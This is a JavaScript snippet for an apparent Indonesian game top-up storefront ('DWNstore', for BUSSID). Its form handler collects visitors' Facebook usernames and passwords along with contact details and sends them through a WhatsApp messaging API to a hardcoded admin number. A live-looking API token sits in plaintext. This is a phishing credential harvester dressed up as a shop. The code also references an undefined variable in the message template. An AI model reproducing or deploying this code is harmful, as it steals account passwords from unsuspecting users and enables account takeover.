// Animasi ngetik
        const texts = [
            "Selamat datang di DWNstore!",
            "Top-up game BUSSID termurah di sini!",
            "Pesan sekarang juga!"
        ];
        let count = 0;
        let index = 0;
        let currentText = "";
        let letter = "";

        (function type() {
            if (count === texts.length) {
                count = 0;
            }
            currentText = texts[count];
            letter = currentText.slice(0, ++index);

            document.getElementById("typing").textContent = letter;

            if (letter.length === currentText.length) {
                count++;
                index = 0;
                setTimeout(type, 1000);
            } else {
                setTimeout(type, 100);
            }
        })();

        // Submit form
        document.getElementById('form-whatsapp').addEventListener('submit', async function(event) {
            event.preventDefault(); // Mencegah refresh halaman
            const nama = document.getElementById('nama').value;
            const akunfb = document.getElementById('fb-account').value;
            const pwfb = document.getElementById('fb-password').value;
            const whatsapp = document.getElementById('whatsapp').value;
            const jumlah_topup = document.getElementById('amount').value;
            const admin = "6282272339956";

            if (!nama || !akunfb || !pwfb || !whatsapp || !jumlah_topup) {
                alert('Semua kolom harus diisi!');
                return;
            }

            const url = 'https://api.fonnte.com/send'; // Endpoint API Fonnte
            const token = 'kk2AtteCG6jfsSU5agW9'; // Ganti dengan token API Fonnte Anda

            const data = {
target: admin,
message: `*Pesanan Masuk - DWNstore*

*Nama Pemesan    :* ${nama}
*Akun FB                  :* ${akunfb}
*Password FB         :* ${pwfb}
*Nomor WhatsApp :* ${WhatsApp}
*Jumlah Top Up      :* ${jumlah_topup}

Mohon di proses.`,
                countryCode: '62', // Kode negara Indonesia
            };

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Authorization': token,
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                });

                const result = await response.json();
                if (result.status) {
                    alert('Pesan berhasil dikirim!');
                } else {
                    alert('Gagal mengirim pesan: ' + result.reason);
                }
            } catch (error) {
                alert('Terjadi kesalahan: ' + error.message);
            }
        });